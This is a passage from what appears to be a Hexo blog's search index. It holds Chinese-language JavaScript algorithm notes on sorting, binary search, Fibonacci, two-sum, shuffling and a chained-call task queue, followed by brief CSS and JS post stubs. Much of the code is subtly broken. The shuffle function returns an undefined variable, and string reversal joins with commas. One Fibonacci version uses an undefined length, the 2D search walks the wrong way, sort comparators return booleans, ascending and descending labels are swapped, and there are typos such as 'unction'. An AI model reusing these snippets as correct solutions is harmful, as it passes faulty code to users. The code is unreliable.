放在当前索引对应的数的前面 // temp = arr[i]; // arr[i] = arr[minIndex]; // arr[minIndex] = temp; // es6数组结构实现元素交换 [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]]; &#125; return arr;&#125;// 以数组[1, 8, 5, 4, 7, 3, 9, 2, 6]为例，实际选择排序如下：// ① 8 5 4 7 3 9 2 6 // 1与1交换// // 1 ⑧ 5 4 7 3 9 ② 6 // 8与2交换// 1 2 5 4 7 3 9 8 6// // 1 2 ⑤ 4 7 ③ 9 8 6 // 5与3交换// 1 2 3 4 7 5 9 8 6// // 1 2 3 ④ 7 5 9 8 6 // 4与4交换// 1 2 3 4 7 5 9 8 6// // 1 2 3 4 ⑦ ⑤ 9 8 6 // 7与5交换// 1 2 3 4 5 7 9 8 6// // 1 2 3 4 5 ⑦ 9 8 ⑥ // 7与6交换// 1 2 3 4 5 6 9 8 7// // 1 2 3 4 5 6 ⑨ 8 ⑦ // 9与7交换// 1 2 3 4 5 6 7 8 9// // 1 2 3 4 5 6 7 ⑧ 9 // 8与8交换// 1 2 3 4 5 6 7 8 9 快速排序 从数列中挑出一个元素，称为 “基准”（pivot）; 重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作； 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function quickSort(arr) &#123; if (arr.length &lt;= 1) &#123; return arr; &#125; let leftArr = []; let rightArr = []; let pivot = arr[0]; // 选择第一项作为基准值 for (let i = 1; i &lt; arr.length; i++) &#123; // 从1开始遍历，因为0已经作为基准值使用了 if (arr[i] &gt; pivot) &#123; rightArr.push(arr[i]); &#125; else&#123; leftArr.push(arr[i]); &#125; &#125; return [].concat(quickSort(leftArr), [pivot], quickSort(rightArr)); // 拼接左分区、基准值、右分区（进行递归）&#125;// 以数组[1, 8, 5, 4, 7, 3, 9, 2, 6]为例，实际快速排序如下：// arr:[1, 8, 5, 4, 7, 3, 9, 2, 6] // ├── left: []// │// ├── pivot: 1// │// └── right:[8, 5, 4, 7, 3, 9, 2, 6]// │// ├── left: [5, 4, 7, 3, 2, 6]// │ │// │ ├── left: [4, 3, 2]// │ │ │// │ │ ├── left: [3, 2]// │ │ │ │ // │ │ │ ├── left: [2]// │ │ │ │// │ │ │ ├── pivot: 3// │ │ │ │// │ │ │ └── right: []// │ │ │ // │ │ ├── pivot: 4// │ │ │// │ │ └── right: []// │ │ // │ ├── pivot: 5// │ │// │ └── right: [7, 6]// │ │// │ ├── left: [6]// │ │// │ ├── pivot: 7// │ │// │ └── right: []// │ // ├── pivot: 8// │// └── right: [9]// // // 按上图拆分完毕后，从内到外拼接（递归）即可完成排序得到：[1, 2, 3, 4, 5, 6, 7, 8, 9] 插入排序 将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。 从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。） 1234567891011121314function insertionSort(arr) &#123; var len = arr.length; var preIndex, current; for (var i = 1; i &lt; len; i++) &#123; preIndex = i - 1; current = arr[i]; while(preIndex &gt;= 0 &amp;&amp; arr[preIndex] &gt; current) &#123; arr[preIndex+1] = arr[preIndex]; preIndex--; &#125; arr[preIndex+1] = current; &#125; return arr;&#125; 二路归并排序将两个按值有序序列合并成一个按值有序序列1234567891011121314151617181920function merge(left, right) &#123; var result = [], il = 0, ir = 0; while (il &lt; left.length &amp;&amp; ir &lt; right.length) &#123; if (left[il] &lt; right[ir]) &#123; result.push(left[il++]); &#125; else &#123; result.push(right[ir++]); &#125; &#125; while(left[il])&#123; result.push(left[il++]); &#125; while(right[ir])&#123; result.push(right[ir++]); &#125; return result;&#125; 希尔排序123456789101112131415161718function shellSort(arr) &#123; var len = arr.length, temp, gap = 1; while(gap &lt; len/3) &#123; //动态定义间隔序列 gap =gap*3+1; &#125; for (gap; gap &gt; 0; gap = Math.floor(gap/3)) &#123; for (var i = gap; i &lt; len; i++) &#123; temp = arr[i]; for (var j = i-gap; j &gt;= 0 &amp;&amp; arr[j] &gt; temp; j-=gap) &#123; arr[j+gap] = arr[j]; &#125; arr[j+gap] = temp; &#125; &#125; return arr;&#125; 其他排序应用数字、英文排序1234567891011121314151617// 顺序：function sortArr (arr)&#123; return arr.sort();&#125;// 或：function sortArr (arr)&#123; return arr.sort(function (a, b) &#123; return a &gt; b &#125;);&#125;// 倒序：function sortArr (arr)&#123; return arr.sort(function (a, b) &#123; return a &lt; b &#125;);&#125; 中文姓名排序12345678910111213// 顺序function sortNameArr (arr) &#123; return arr.sort(function (a, b) &#123; return b.localeCompare(a, 'zh-Hans-CN') &#125;)&#125;// 倒序function sortNameArr (arr) &#123; return arr.sort(function (a, b) &#123; return a.localeCompare(b, 'zh-Hans-CN') &#125;)&#125; 数组乱序遍历法取随机位的值与当前的互换1234567function shuffle(arr) &#123; for (var i = arr.length - 1; i &gt; 0; i--) &#123; var j = Math.floor(Math.random() * (i + 1)); [arr[i], arr[j]] = [arr[j], arr[i]]; &#125; return array; &#125; sort法随机数大于0.5的概率为1/2，然后选择顺序或倒序即可123456function shuffle(arr) &#123; arr.sort((a, b) =&gt; &#123; var sign = (Math.random() &gt; 0.5) ? 1 : -1; return (a - b) * sign; &#125;);&#125; Number数组中最大差值123456789101112function getMaxProfit (arr) &#123; var min = arr[0], max = arr[0]; for (var i = 0; i &lt; arr.length; i++) &#123; if (arr[i] &lt; min) &#123; min = arr[i]; &#125; if (arr[i] &gt; max) &#123; max = arr[i]; &#125; &#125; return max - min;&#125; 打印九九乘法表1234567for (var n = 1; n &lt;= 9; n++) &#123; for (var m = 1; m &lt; n+1; m++) &#123; var b = m * n; document.write(m + "×" + n + "=" + b + " "); &#125; document.write("&lt;br/&gt;&lt;br/&gt;");&#125; 求数组交集和差级ES7方法：123let intersection = a.filter(v =&gt; b.includes(v)) let difference = a.concat(b).filter(v =&gt; !a.includes(v) || !b.includes(v)) 字符串翻转转换成array123function reverseString(str) &#123; return str.split('').reverse().join();&#125; 反向遍历123456function reverseString(str)&#123; var tmp = ''; for(var i = str.length - 1;i &gt;= 0; i--) tmp += str[i]; return tmp&#125; 生成随机字符串1234567function randomString(n)&#123; var str = 'abcdefghijklmnopqrstuvwxyz0123456789'; var tmp = ''; for(var i = 0; i &lt; n; i++) tmp += str.charAt(Math.round(Math.random()*str.length)); return tmp;&#125; 判断回文123456789101112131415// 算法思想：每次判断第一个字符和最后一个字符是否相等，然后取第二个字符到倒数第二个字符之间的字符串递归function palindrome(str)&#123; // \W匹配任何非单词字符，即去除非正常字符。等价于“[^A-Za-z0-9_]”。 var re = /[\W_]/g; // 将字符串变成小写字符,并干掉除字母数字外的字符 var lowRegStr = str.toLowerCase().replace(re, ''); // 如果字符串lowRegStr的length长度为0时，字符串即是palindrome if(lowRegStr.length === 0) return true; // 如果字符串的第一个和最后一个字符不相同，那么字符串就不是palindrome if(lowRegStr[0] !== lowRegStr[lowRegStr.length - 1]) return false; //递归 return palindrome(lowRegStr.slice(1, lowRegStr.length - 1));&#125; 统计出现最多的元素最常见的思路是先使用object统计出元素和个数，再循环取最大的，但这样无疑会增加复杂度。所以需要在第一次遍历的时候就缓存好最大的元素。 统计字符串中最多的字母和出现的次数1234567891011121314151617181920// 算法思想：先遍历，将出现的字符和次数以object的形式输出；再obj遍历，输出次数最多的字符function findMaxDuplicateChar(str) &#123; if(str.length == 1) &#123; return str; &#125; var charObj = &#123;&#125;; var maxElArr = [str.charAt(0), 0];// 次数最多的元素和次数，默认为第一个 for(var i = 0; i &lt; str.length; i++) &#123; if(!charObj[str.charAt(i)]) &#123; charObj[str.charAt(i)] = 1; &#125; else &#123; charObj[str.charAt(i)] += 1; if (charObj[str.charAt(i)] &gt;= maxElArr[1]) &#123; maxElArr = [str.charAt(i), charObj[str.charAt(i)]]; &#125; &#125; &#125; console.log(charObj, maxElArr); return maxElArr;&#125; 统计数组中出现最多次数的元素和次数1234567891011121314151617181920function findMaxDuplicateArr(arr) &#123; if(arr.length == 1) &#123; return arr[0]; &#125; var obj = &#123;&#125;; var maxElArr = [arr[0], 0]; // 次数最多的元素和次数，默认为第一个 for(var i = 0; i &lt; arr.length; i++) &#123; if(!obj[arr[i]]) &#123; obj[arr[i]] = 1; &#125; else &#123; obj[arr[i]] += 1; if (obj[arr[i]] &gt;= maxElArr[1]) &#123; maxElArr = [arr[i], obj[arr[i]]]; &#125; &#125; &#125; console.log(obj, maxElArr); return maxElArr;&#125; 阶乘1x2x3x4x5… 递归12345678function factorialize(num) &#123; var result = 1; if(num &lt; 0) return -1; if(num == 0 || num == 1) return 1; if(num &gt; 1)&#123; return num * factorialize(num - 1); &#125;&#125; 非递归12345678function factorialize(num) &#123; var result = 1; if(num &lt; 0) return -1; if(num == 0 || num == 1) return 1; while(num &gt; 1) result *= num--; return result;&#125; 生成斐波那契数列斐波那契数列（黄金分割数列）: 0、1、1、2、3、5、8、13、21、34，考察递归 递归123456789101112131415function getfib(n)&#123; if (n == 0) return 0; if (n == 1) return 1; if (n &gt; 1) &#123; return getfib(n - 1) + getfib(n - 2); &#125;&#125;function fibo(len)&#123; var fibo = []; for(var i = 0; i &lt; len; i++) fibo.push(getfib(i)); return fibo;&#125; 123456789function getfib(n)&#123; const res = [] res[0] = 0 res[1] = 1 for (let i = 0; i &lt;= len; i++) &#123; res[i] = getfib(i - 1) + getfib(i - 2) &#125; return res&#125; 非递归12345678910111213function getFibonacci(n) &#123; var fibarr = []; var i = 0; while(i &lt; n) &#123; if(i &lt;= 1) &#123; fibarr.push(i); &#125; else &#123; fibarr.push(fibarr[i - 1] + fibarr[i - 2]) &#125; i++; &#125; return fibarr;&#125; 二分查找查找某个值是否在有序数组中，有则返回索引，数组必须是有序的 注意：还有一种不传起始和终止下标参数，通过在函数体内使用slice取到新的arr，整体没有这种方法好。 递归12345678910111213141516171819202122232425/** * 递归实现二分查找，前提必须是有序数组，返回索引位置 * @param &#123;*&#125; arr 目标数组 * @param &#123;*&#125; value 查询的值 * @param &#123;*&#125; start 从arr数查询的起始位置 * @param &#123;*&#125; end 从arr中查询的结束位置 * @returns i */function binaryQuery (arr, value, start, end) &#123; start = start || 0 end = end || arr.length - 1 const center = parseInt((start + end) / 2) if (arr[center] === value) &#123; // 找到直接跳出 return center &#125; else if (arr[center] &lt; value) &#123; // 在右区间递归 return binaryQuery(arr, value, center + 1, end) &#125; else if (arr[center] &gt; value) &#123; // 在左区间递归 return binaryQuery(arr, value, start, center - 1) &#125;&#125;binaryQuery([1, 2, 3, 4, 5, 6], 5) 非递归12345678910111213141516171819202122/** * while二分查找，前提必须是有序数组，返回索引位置 * @param &#123;*&#125; arr 目标数组 * @param &#123;*&#125; value 查询的值 * @returns i */function binaryQuery (arr, key) &#123; var start = 0, end = arr.length - 1; while (start &lt;= end) &#123; var mid = parseInt((start + end) / 2) if (key === arr[mid]) &#123; return mid; &#125; else if (key &gt; arr[mid]) &#123; start = mid + 1; &#125; else if (key &lt; arr[mid]) &#123; end = mid - 1; &#125; &#125; return -1;&#125;binaryQuery([1, 2, 3, 4, 5, 6], 5) 找出数组当中的质数质数：也称素数，&gt;1, 有无限个。除1和它自身之外不能被其他数整除，如2、3、5、7等，否则称为合数。1234567891011121314151617181920212223242526// 思想：m % n === 0, 等于0表示能整除，即不是质数// 循环生成一个100内的数组var i, arr = [];for (i = 1; i &lt; 100; i++) &#123; arr.push(i);&#125;var getPrimes = arr.filter((el) =&gt; &#123; var flag = true; // 定义一个boolean值，filter返回布尔值 if (el &lt; 2) &#123; // 小于2的直接排除 flag = false; &#125; else &#123; // 使用小于当前元素的数值去整除当前当前元素，有一个可以整除则跳出循环 for (var j = 2; j &lt; el; j++) &#123; if (el % j === 0) &#123; flag = false; break; &#125; &#125; &#125; return flag;&#125;);console.log(getPrimes) js求1! + 2! + 3! + 4! + 5!(阶乘)思路：s转换成 1! + (2 * 1!) + (3 * 2!) + (4 * 3!) + (5 * 4!)123456789var sum = 0, // 总和 sum2 = 1;for (var i = 1; i &lt;= 5; i++) &#123; sum2 *= i; // 当前第一数 sum += sum2;&#125;console.log(sum) 两数之和给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。示例1234给定 nums = [2, 7, 11, 15], target = 9因为 nums[0] + nums[1] = 2 + 7 = 9所以返回 [0, 1] 解答12345678910111213141516171819202122232425262728293031323334// 常规错误想法// 原因：未考虑相同位相加，如[3, 2, 4]，会返回[0, 0]，因为相同位的3 + 3已经满足了条件/** * @param &#123;number[]&#125; nums * @param &#123;number&#125; target * @return &#123;number[]&#125; */var twoSum = function(nums, target) &#123; for (var i = 0; i &lt; nums.length; i++) &#123; for (var j = 0; j &lt; nums.length; j++) &#123; if (nums[i] + nums[j] === target) &#123; return [i, j]; &#125; &#125; &#125;&#125;;// 正确解法: 双重循环式避开i和j相等的情况/** * @param &#123;number[]&#125; nums * @param &#123;number&#125; target * @return &#123;number[]&#125; */var twoSum = function(nums, target) &#123; for (var i = 0; i &lt; nums.length; i++) &#123; for (var j = i + 1; j &lt; nums.length; j++) &#123; if (nums[i] + nums[j] === target) &#123; return [i, j]; &#125; &#125; &#125;&#125;; 无重复字符的最长子串给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。 示例示例 1:123输入: &quot;abcabcbb&quot;输出: 3 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。 示例 2:123输入: "bbbbb"输出: 1解释: 因为无重复字符的最长子串是 "b"，所以其长度为 1。 示例 3:1234输入: "pwwkew"输出: 3解释: 因为无重复字符的最长子串是 "wke"，所以其长度为 3。 请注意，你的答案必须是 子串 的长度，"pwke" 是一个子序列，不是子串。 解答1234567891011121314151617181920212223242526272829303132// 暴力法：耗时过长/** * @param &#123;string&#125; s * @return &#123;number&#125; */var lengthOfLongestSubstring = function(s) &#123; var maxLen = 0; for (var i = 0; i &lt; s.length; i++) &#123; for (var j = i + 1; j &lt;= s.length; j++) &#123; // 通过确定i、j来获取所有的连续的子串，再通过方法查找该子串中是否存在重复的字符 if (allUnique(s, i, j)) maxLen = Math.max(maxLen, j - i); &#125; &#125; return maxLen;&#125;; /** * 检查一个子字符串是否含有重复的字符 * @param &#123;string&#125; str * @param &#123;number&#125; start * @param &#123;number&#125; end * @return &#123;boolean&#125; */var allUnique = function(str, start, end) &#123; var tempStr = ''; for (var i = start; i &lt; end; i++) &#123; // 查看临时字符串中是否已经包含了当前字符 if (tempStr.includes(str.charAt(i))) return false; tempStr += str.charAt(i); // 不包含则存储 &#125; return true;&#125; 整数反转给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。示例示例 1:12输入: 123输出: 321 示例 2:12输入: -123输出: -321 示例 3:12输入: 120输出: 21 假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−2^31, 2^31 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。 解答1234567891011121314151617181920212223242526/** * @param &#123;number&#125; x * @return &#123;number&#125; */var reverse = function(x) &#123; let sum = 0, // 翻转后的 num = Math.abs(x); // 取绝对值 // 核心 while(num) &#123; sum = sum * 10 + num % 10; num = parseInt(num / 10); &#125; // 核心代码壳可改成：借助数组reverse方法直接翻转 // sum = parseInt(String(num).split('').reverse().join('')); sum = x &gt; 0 ? sum : -sum; // 补上原先的正负符号 // 判断溢出情况 if (sum &gt; Math.pow(2, 31) || sum &lt; -Math.pow(2, 31)) &#123; return 0; &#125; return sum;&#125;; 走楼梯10个台阶，每次只能上1个、2个或3个，一共有多少种走法？ 拆分：如果上10个台阶，可以分解以下情况： 上9个台阶，最后上1个台阶，假设这种前面9个的走法是 m 种。 上8个台阶，最后上2个台阶，假设这种前面8个的走法是 n 种。 上7个台阶，最后上3个台阶，假设这种前面7个的走法是 l 种。所以上10个台阶的方法其实就是 m + n + l 种 同理：1 中的上9个台阶也可以分为： 上8个台阶，最后上1个台阶，假设这种前面8个的走法是 m 种。 上7个台阶，最后上2个台阶，假设这种前面7个的走法是 n 种。 上6个台阶，最后上3个台阶，假设这种前面6个的走法是 l 种。所以上9个台阶的方法其实就是 x + y + z 种 可以递归为：f(n) = f(n - 1) + f(n - 2) + f(n - 3) 12345678910111213141516171819// 从后往前递归// 每次可走1、2步function step(n) &#123; if (n === 1) return 1 // 1 else if (n === 2) return 2 // 1+1、2 else return step(n - 1) + step(n - 2)&#125;// 89// 每次可走1、2、3步function step(n) &#123; if (n === 1) return 1 // 1 else if (n === 2) return 2 // 1+1、2 else if (n === 3) return 4 // 1+1+1+1、1+1+2、2+2、1+3 else return step(n - 1) + step(n - 2) + step(n - 3)&#125;// 274 今日头条算法推导题假设在今日头条里面，有很多工作人员检查新闻是不是属于虚假新闻，所有新闻真实率到达了98%，工作人员在检验一个真实的新闻把它检验为一个虚假的新闻的概率为2%，而一个虚假的新闻被检验为真实的新闻的概率为5%. 那么，一个被检验为真实的新闻确实是真实的新闻的概率是多大? A.0.9991 B.0.9989 C.0.9855 D.0.96 答案:B 分析条件得到：真的新闻：98%假的新闻：2%真的-&gt;假的：2%假的-&gt;真的：5% 分析要求：被检验为真实的新闻确实是真实的新闻 首先要明确被检验为真实的新闻包括了（本来是真的和本来是假的）所以分子为（真-&gt;真），分母为（真-&gt;真 + 假-&gt;真） 结果为：（真-&gt;真）/（真-&gt;真 + 假-&gt;真） = (98%(1-2%)) / (98%(1-2%) + 2%*5%) = 0.9604/0.9614 = 0.9989…… 求排列组合[a] 得到 [a][a, b] 得到 [a, b, ab][a, b, c] 得到 [a, b, ab, c, ac, bc, abc][a, b, c, d] 得到 [a, b, ab, c, ac, bc, abc, d, ad, bd, abd, cd, acd, bcd, abcd] 分析： [a]的结果为[a]，数量为1 从[a]到[a, b]，结果其实是[a]的结果加上b元素，然后再将[a]结果中的每一个元素和b进行组合，得到[a, b, ab]，总数为 1+1+1=3 从[a, b]到[a, b, c]，结果其实是[a, b]的结果加上c元素，然后将[a, b]结果中的每一个元素和c进行组合，得到[a, b, ab, c, ac, bc, abc]，总数为3+1+3 = 7 所以，n个元素的排列组合为：fn = f(n-1) + 1 + f(n-1) 要实现多个元素的排列组合，可以从1个元素开始算，随着遍历往后移动，将前一个的结算结果与新元素拼接，然后进行组合，完成之后再覆盖临时变量 实现：12345678910111213141516171819function fn (arr) &#123; let res = [] // 存放最终的结果 let temp = [] // 临时存放 for (let i = 0; i &lt; arr.length; i++) &#123; temp.push(arr[i]) // 暂存单个元素 for (let j = 0; j &lt; res.length; j++) &#123; temp.push(res[j] + arr[i]) // 将上一轮得到的结果与新增元素进行一轮组合 &#125; res = [...temp] // 将这一轮的结果全部存入res中 // 或： // res.push(temp) // temp = [] &#125; return res&#125;// ['a']: ['a']// ['a', 'b']: ["a", "b", "ab"]// ['a', 'b', 'c']: ["a", "b", "ab", "c", "ac", "bc", "abc"] 如果变换一下需求，如果想：[a] 得到 [a][a, b] 得到 [a, ab][a, b, c] 得到 [a, ab, abc][a, b, c, d] 得到 [a, ab, abc, abcd] 最简单结合slice方法如下：1234567function fn (arr) &#123; let res = [] for (let i = 0; i &lt; arr.length; i++) &#123; res.push(arr.slice(0, i + 1).join('')) &#125; return res&#125; 如果不可以使用slice方法：1234567891011function fn (arr) &#123; let res = [] // 存放最终的结果 for (let i = 0; i &lt; arr.length; i++) &#123; if (!res.length) &#123; res.push(arr[i]) &#125; else &#123; res.push(res[res.length - 1] + arr[i]) &#125; &#125; return res&#125; 用两个栈实现一个队列1234567891011121314151617181920212223242526272829// 用两个栈（后进先出 push、pop）实现队列（先进先出 push shift）var stack1 = [] // 存放元素，实际以stack1为准var stack2 = []// 尾部添加function addFn (val) &#123; stack1.push(val)&#125;// 头部删除function deleteFn () &#123; // 把stack1中的元素倒序放入stack2中 while (stack1.length) &#123; const stackTop = stack1.pop() if (stackTop) stack2.push(stackTop) &#125; // 此时stack2有元素，stack1无元素，获取栈顶元素 const res = stack2.pop() // 再把stack2中的元素再次倒序放回到stack1中（复原stack1，此时栈顶元素已被移除） while (stack2.length) &#123; const stackTop = stack2.pop() if (stackTop) stack1.push(stackTop) &#125; // 注意删除元素时会返回该元素 return res || null&#125; 实现不规范版本号的排序1234567891011121314151617181920// ['1.1.1', '1.1.1.1.1', '65.1.1', '6.5.1', '7']// 从大到小排列function sort (arr) &#123; return arr.sort((a, b) =&gt; &#123; const aArr = a.split('.') const bArr = b.split('.') let i = 0 while (true) &#123; const s1 = aArr[i] const s2 = bArr[i] i++ if (!s1 || !s2) return bArr.length - aArr.length if (s1 === s2) continue return s2 - s1 &#125; &#125;)&#125;sort(['1.1.1', '1.1.1.1.1', '65.1.1', '6.5.1', '7'])// ["65.1.1", "7", "6.5.1", "1.1.1.1.1", "1.1.1"] 输入一组数，输出最大组合数12345678910111213141516171819202122232425262728293031323334353637383940414243// 例如：[31, 3, 34]，输出 34331// 例如：[12, 7, 50]，输出 75012unction getBigNumber (arr) &#123; return Number(arr.sort((a, b) =&gt; &#123; // 方法1: 直接比较法 // return Number(`$&#123;b&#125;$&#123;a&#125;`) - Number(`$&#123;a&#125;$&#123;b&#125;`) // 从大到小为b-a，从小到大为a-b // 方法2: 按位比较法，获取最优的顺序 a = String(a) b = String(b) let aLen = a.length let bLen = b.length let aIndex = 0 let bIndex = 0 while (1) &#123; // 从前往后比较数字 if (a[aIndex] === b[bIndex]) &#123; aIndex++ bIndex++ if (aIndex === aLen &amp;&amp; bIndex &lt; bLen) &#123; // a遍历结束，b未结束，即 aLen &lt; bLen，如 5 和 53，取a的第一元素和b的超出位第1个元素比较（5 和 3 比较） return b[bIndex] - a[0] &#125; if (bIndex === bLen &amp;&amp; aIndex &lt; aLen) &#123; // b遍历结束，a未结束，即 aLen &gt; bLen，如 53 和 5，取a的超出位第1个元素和b的第1个元素比较（3 和 5 比较） return b[0] - a[aIndex] &#125; if (aIndex === aLen &amp;&amp; bIndex === bLen) &#123; // a、b都遍历结束 return b[bIndex] - a[aIndex] &#125; &#125; else &#123; // 不等则进行排序，从大到小 return b[bIndex] - a[aIndex] &#125; &#125; &#125;).join(''))&#125;getBigNumber([31, 3, 34]) // 34331getBigNumber([12, 7, 50]) // 75012 二叉树排列（从上到下，从左到右）12 二叉树的蛇形排列（从上到下，奇数行从左到右，偶数行从右到左）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// 基数行按照从左到右，偶数行按照从右到左function zigzagLevelOrder (root) &#123; const res = [] helpr(root, 0, res) // return res // 此时res是一个二维数组 // 如果想返回一维数组，需要增加一个数组扁平化的操作 return res.toString().split(',') // return flatten(res)&#125;function helper(node, level, res) &#123; if (!node) return if (!res[level]) &#123; // res[level] = [] res.push([]) &#125; if (level % 2 === 0) &#123; // 偶数行（从左到右，push） res[level].push(node.val) &#125; else &#123; // 奇数行（从右到左，unshift） res[level].unshift(node.val) &#125; helper(node.left, level + 1, res) helper(node.right, level + 1, res)&#125;// 多维数组数组扁平化function flatten (arr) &#123; return arr.toString().split(',')&#125;function flatten1 (arr) &#123; return arr.reduce((prev, cur, index, self) =&gt; &#123; return prev.concat(Array.isArray(cur) ? flatten(cur) : cur) &#125;)&#125;function flatten2 (arr) &#123; const result = [] arr.forEach((item) =&gt; &#123; if (Array.isArray(item)) &#123; result = result.concat(flatten2(item)) &#125; else &#123; result = result.concat(item) &#125; &#125;) return result&#125;function flatten3 (arr) &#123; while (arr.some(item =&gt; Array.isArray(item))) &#123; arr = [].concat(...arr) &#125; return arr&#125;function flatten3 (arr) &#123; return arr.flat() // 默认只能拉平一层，参数传2，就拉平2层，传3就拉平3层&#125; 二维有序数组的查找12345678// [// [1,2,8,9],// [2,4,9,12],// [4,7,10,13],// [6,8,11,15]// ]// 给定 target = 7，返回 true。// 给定 target = 3，返回 false。 for循环 + includes、indexOf1234567function find(target, array) &#123; for (let i = 0; i &lt; array.length; i++) &#123; if (array[i].includes(target)) &#123; return true &#125; &#125;&#125; some + includes、indexOf123function find(target, array) &#123; return array.some(arr =&gt; arr.includes(target))&#125; 线性查找123456789101112131415161718192021222324252627// 从右上角开始查找：比目标数大向左走，比目标数小向下走function find(target, array) &#123; let x = array.length let y = array[0].length let i = 0 let j = y - 1 while (i &lt; x &amp;&amp; j &gt;= 0) &#123; if (array[i][j] === target) return true else if (array[i][j] &gt; target) i -= 1 else if (array[i][j] &lt; target) j += 1 &#125; return false&#125;// 从左下角开始查找：比目标数大向上走，比目标数小向右走function find(target, array) &#123; let x = array.length let y = array[0].length let i = x - 1 let j = 0 while (i &gt;= 0 &amp;&amp; j &lt; y) &#123; if (array[i][j] === target) return true else if (array[i][j] &gt; target) i -= 1 else if (array[i][j] &lt; target) j += 1 &#125; return false&#125; 防疲劳设置弹窗每 10s 内只能出现 3次，假定弹窗本身只能看，不能操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function showAlert (count) &#123; console.log('alert visible:', count)&#125;function fn (time, n) &#123; var count = 0 return function () &#123; if (count &gt;= n) return showAlert(count) count++ setTimeout(() =&gt; &#123; count-- &#125;, time * 1000) &#125;&#125;var f = fn(10, 3)// 执行结果（sleep不需要实现）console.log('sleep_0')f() // 打印setTimeout(() =&gt; &#123; console.log('sleep_' + 3*10e2) f() // 打印&#125;, 3*10e2)setTimeout(() =&gt; &#123; console.log('sleep_' + 6*10e2) f() // 打印&#125;, 6*10e2)setTimeout(() =&gt; &#123; console.log('sleep_' + 11*10e2) f() // 打印&#125;, 11*10e2)setTimeout(() =&gt; &#123; console.log('sleep_' + 13*10e2) f() // 不打印&#125;, 13*10e2)setTimeout(() =&gt; &#123; console.log('sleep_' + 14*10e2) f() // 打印&#125;, 14*10e2)setTimeout(() =&gt; &#123; console.log('sleep_' + 15*10e2) f() // 不打印&#125;, 15*10e2)setTimeout(() =&gt; &#123; console.log('sleep_' + 18*10e2) f() // 打印&#125;, 18*10e2)setTimeout(() =&gt; &#123; console.log('sleep_' + 20*10e2) f() // 不打印&#125;, 20*10e2) 链式调用实现执行、等待执行、先执行操作1234567891011121314151617181920212223/** * waitFirst 优先级大于 wait，先执行waitFirst，再执行前面的，再执行后面的 * * fn('msg') * console.log('hello msg') * * fn('msg').wait(5).do('str') * console.log('hello msg') * ... wait 5s * console.log('hello str') * * fn('msg').wait(5).do('str').do('name') * console.log('hello msg') * ... wait 5s * console.log('hello str') * console.log('hello name') * * fn('msg').waitFirst(5).do('str').do('name') * ... wait 5s * console.log('hello msg') * console.log('hello str') * console.log('hello name') */ 链式调用的原理：一个对象里面的多个方法，每个方法内部return this，这样后面的方法在调用的时候就可以继续在this环境下执行。12345678910111213const obj = &#123; eat () &#123; console.log('eat') return this &#125;, drink () &#123; console.log('drink') return this &#125;&#125;obj.eat().drink() // eat、drinkobj.drink().eat() // drink、eat 本题实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function Fn (msg) &#123; this.msg = msg this.queue = [] // 使用任务队列（先进先出的思想模拟执行顺序） const fn = () =&gt; &#123; console.log(`hello $&#123;msg&#125;`) this.next() // 执行完之后取出队列下一个函数执行 &#125; this.queue.push(fn) setTimeout(() =&gt; &#123; console.log(this) this.next() &#125;, 0) // 异步，先等prototype执行完，将所以事件进行收集再执行 return this&#125;Fn.prototype = &#123; wait (time) &#123; const fn = () =&gt; &#123; setTimeout(() =&gt; &#123; this.next() &#125;, time * 1000) &#125; this.queue.push(fn) // 普通级别的放在队尾 return this &#125;, waitFirst (time) &#123; const fn = () =&gt; &#123; setTimeout(() =&gt; &#123; this.next() &#125;, time * 1000) &#125; this.queue.unshift(fn) // 优先级高的放入队首 return this &#125;, do (name) &#123; const fn = () =&gt; &#123; console.log(`hello $&#123;name&#125;`) this.next() &#125; this.queue.push(fn) // 普通级别的放在队尾 return this &#125;, // 从任务队列中取出函数执行 next () &#123; const fn = this.queue.shift() // 从头部取出函数 fn &amp;&amp; fn() &#125;&#125;// new Fn('msg')// new Fn('msg').wait(2).do('aaa')// new Fn('msg').wait(2).do('aaa').do('bbb')// new Fn('msg').waitFirst(2).do('aaa').do('bbb')new Fn('msg').waitFirst(2).wait(2).do('bbb')]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[父级设置圆角无法挡住子级的背景色的解决办法]]></title>
    <url>%2Fblog%2Fcss%2F%E7%88%B6%E7%BA%A7%E8%AE%BE%E7%BD%AE%E5%9C%86%E8%A7%92%E6%97%A0%E6%B3%95%E6%8C%A1%E4%BD%8F%E5%AD%90%E7%BA%A7%E7%9A%84%E8%83%8C%E6%99%AF%E8%89%B2%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
    <content type="text"><![CDATA[问题如下图： 解决办法如下：1234-webkit-backface-visibility: hidden;-moz-backface-visibility: hidden;-webkit-transform: translate3d(0, 0, 0);-moz-transform: translate3d(0, 0, 0); 参考：https://blog.csdn.net/wangshuo0407/article/details/79844596]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js判断对象object中存在某个key]]></title>
    <url>%2Fblog%2Fjavascript%2F%E5%88%A4%E6%96%AD%E5%AF%B9%E8%B1%A1%E4%B8%AD%E5%AD%98%E5%9C%A8%E6%9F%90%E4%B8%AAkey.html</url>
